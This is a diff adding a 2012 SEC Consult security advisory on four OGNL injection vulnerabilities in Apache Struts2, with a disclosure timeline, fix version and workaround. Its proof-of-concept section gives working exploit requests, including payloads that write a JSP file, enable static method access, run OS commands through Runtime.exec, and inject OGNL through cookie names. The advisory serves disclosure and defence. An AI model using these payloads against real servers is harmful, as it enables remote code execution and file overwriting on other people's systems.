@@ -1,0 +1,210 @@
+SEC Consult Vulnerability Lab Security Advisory < 20120104-0 >
+=======================================================================
+              title: Multiple critical vulnerabilities in Apache Struts2
+            product: Apache Struts2
+                     * OpenSymphony XWork
+                     * OpenSymphony OGNL
+ vulnerable version: 2.3.1 and below
+      fixed version: 2.3.1.1
+             impact: critical
+           homepage: http://struts.apache.org/
+              found: 2011-11-18
+                 by: Johannes Dahse, Andreas Nusser
+                     SEC Consult Vulnerability Lab 
+                     https://www.sec-consult.com
+=======================================================================
+
+Vendor description:
+-------------------
+Apache Struts2 is a web framework for creating Java web applications. It is
+using the OpenSymphony XWork and OGNL libraries. By default, XWork's
+ParametersInterceptor treats parameter names provided to actions as OGNL
+expressions. A OGNL (Object Graph Navigation Language) expression is a limited
+language similar to Java that is tokenized and parsed by the OGNL parser which
+invokes appropiate Java methods. This allows e.g. convenient access to
+properties that have a getter/setter method implemented. By providing a
+parameter like "product.id=1" the OGNL parser will call the appropiate setter
+getProduct().setId(1) in the current action context. OGNL is also able to call
+arbitrary methods, constructors and access context variables. For more details
+please refer to http://commons.apache.org/ognl/language-guide.html.
+
+ 
+Vulnerability overview/description:
+-----------------------------------
+To prevent attackers calling arbitrary methods within parameters the flag
+"xwork.MethodAccessor.denyMethodExecution" is set to "true" and the
+SecurityMemberAccess field "allowStaticMethodAccess" is set to "false" by
+default. Also, to prevent access to context variables an improved character
+whitelist for paramteter names is applied in XWork's ParametersInterceptor since
+Struts 2.2.1.1:
+
+acceptedParamNames = "[a-zA-Z0-9\\.\\]\\[\\(\\)_'\\s]+";
+
+Under certain circumstances these restrictions can be bypassed to execute
+malicious Java code.
+
+1.) Remote command execution in Struts <= 2.2.1.1 (ExceptionDelegator)
+
+When an exception occurs while applying parameter values to properties the
+value is evaluated as OGNL expression. For example this occurs when setting a
+string value to a property with type integer. Since the values are not
+filtered an attacker can abuse the power of the OGNL language to execute
+arbitrary Java code leading to remote command execution. This issue has been
+reported (https://issues.apache.org/jira/browse/WW-3668) and was fixed in
+Struts 2.2.3.1. However the ability to execute arbitrary Java code has been
+overlooked.
+
+2.) Remote command execution in Struts <= 2.3.1 (CookieInterceptor)
+
+The character whitelist for parameter names is not applied to Struts
+CookieInterceptor. When Struts is configured to handle cookie names, an
+attacker can execute arbitrary system commands with static method access to
+Java functions. Therefore the flag "allowStaticMethodAccess" can be set to
+true within the request.
+
+3.) Arbitrary File Overwrite in Struts <= 2.3.1 (ParametersInterceptor)
+
+Accessing the flag "allowStaticMethodAccess" within parameters is prohibited
+since Struts 2.2.3.1. An attacker can still access public constructors with
+only one parameter of type String to create new Java objects and access their
+setters with only one parameter of type String. This can be abused for example
+to create and overwrite arbitrary files. To inject forbidden characters to the
+filename an uninitialized string property can be used.
+
+4.) Remote command execution in Struts <= 2.3.1 (DebuggingInterceptor)
+
+While not being a security vulnerability itself, please note that applications
+running in developer mode and using Struts DebuggingInterceptor are prone to
+remote command execution as well. While applications should never run in
+developer mode during production, developers should be aware that doing so not
+only has performance issues (as documented) but also a critical security
+impact.
+
+
+Proof of concept:
+-----------------
+
+1.) Remote command execution in Struts <= 2.2.1.1 (ExceptionDelegator)
+
+Given Test.java has an property "id" of type Integer or Long and appropriate
+getter and setter methods:
+	long id;
+	
+Given test.jsp with result name=input is configured for action "Test":
+struts.xml:
+	<action name="Test" class="example.Test">
+		<result name="input">test.jsp</result>
+	</action>	
+
+The following request will trigger an exception, the value will be evaluated
+as OGNL expression and arbitrary Java code can be executed:
+
+	/Test.action?id='%2b(new+java.io.BufferedWriter(new+java.io.FileWriter("C:/wwwroot/sec-consult.jsp")).append("jsp+shell").close())%2b'
+	
+An attacker can	also overwrite flags that will allow direct OS command execution:
+	/Test.action?id='%2b(%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc'))%2b'
+
+If test.jsp displays the property "id" the result of the Java code evaluation
+can be accessed:
+	<%@ taglib prefix="s" uri="/struts-tags" %>
+	<s:property value="id" />		
+	
+2.) Remote command execution in Struts <= 2.3.1 (CookieInterceptor)
+
+Given struts.xml is configured to handle all cookie names (independent of
+limited cookie values):
+	<action name="Test" class="example.Test">
+		<interceptor-ref name="cookie">
+			<param name="cookiesName">*</param>
+			<param name="cookiesValue">1,2</param>
+		</interceptor-ref>
+		<result ...>
+	</action>
+
+The following HTTP header will execute an OS command when sent to Test.action:
+	Cookie: (#_memberAccess["allowStaticMethodAccess"]\u003dtrue)(x)=1; x[@java.lang.Runtime@getRuntime().exec('calc')]=1
+
+3.) Arbitrary File Overwrite in Struts <= 2.3.1 (ParametersInterceptor)
+
+Given Test.java has an uninitialized property "name" of type String:
+	String name; // +getter+setter
+
+The following request will create/overwrite the file "C:/sec-consult.txt"
+(empty file):
+	/Test.action?name=C:/sec-consult.txt&x[new+java.io.FileWriter(name)]=1
+	
+The existence of the property 'x' used in these examples is of no importance.
+
+4.) Remote command execution in Struts <= 2.3.1 (DebuggingInterceptor)
+
+Given struts.xml is configured to run in developer mode and to use the
+debugging interceptor:
+	<constant name="struts.devMode" value="true" />
+	<action name="Test" class="example.Test">
+		<interceptor-ref name="debugging" />
+		<result ...>
+	</action>
+	
+The following request will execute arbitrary OGNL expressions leading to remote command execution:
+	/Test.action?debug=command&expression=%23_memberAccess["allowStaticMethodAccess"]=true,@java.lang.Runtime@getRuntime().exec('calc')
+	
+
+Vulnerable / tested versions:
+-----------------------------
+All products using Struts2 are affected by at least one critical vulnerability
+listed above!
+
+Proof of Concept 1.) has been tested with Jetty-6.1.25 26 July 2010 and Struts
+2.2.1.1
+
+Proof of Concepts 2.), 3.) and 4.) have been tested with Jetty-6.1.25 26 July 2010
+and Struts 2.2.1.1, 2.2.3.1 and 2.3.1
+
+
+Vendor contact timeline:
+------------------------
+2011-12-14: Contacting vendor through security at struts dot apache dot org
+2011-12-14: Vendor reply, sending advisory draft
+2011-12-14: Vendor released Apache Struts 2.3.1 in parallel
+2011-12-16: Vulnerabilities confirmed in Struts 2.3.1, Vendor contacted
+2011-12-16: Vendor reply, discussing workaround
+2011-12-20: Discussing release of fixed version
+2011-12-21: Providing additional information
+2012-01-03: Vendor informs that update is ready
+2012-01-03: Patch (2.3.1.1) is available
+
+
+Solution:
+---------
+Update to Struts 2.3.1.1
+
+
+Workaround:
+-----------
+Update to Struts 2.3.1 and apply a stronger acceptedParamNames filter to the
+Parameters- and CookieInterceptor:
+
+acceptedParamNames = "[a-zA-Z0-9\\.\\]\\[_']+";
+
+Don't run your applications in developer mode.
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/advisories.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+SEC Consult Unternehmensberatung GmbH
+
+Office Vienna
+Mooslackengasse 17
+A-1190 Vienna
+Austria
+
+Tel.: +43 / 1 / 890 30 43 - 0
+Fax.: +43 / 1 / 890 30 43 - 25
+Mail: research at sec-consult dot com
+https://www.sec-consult.com
+
+EOF J. Dahse, A. Nusser / 2012
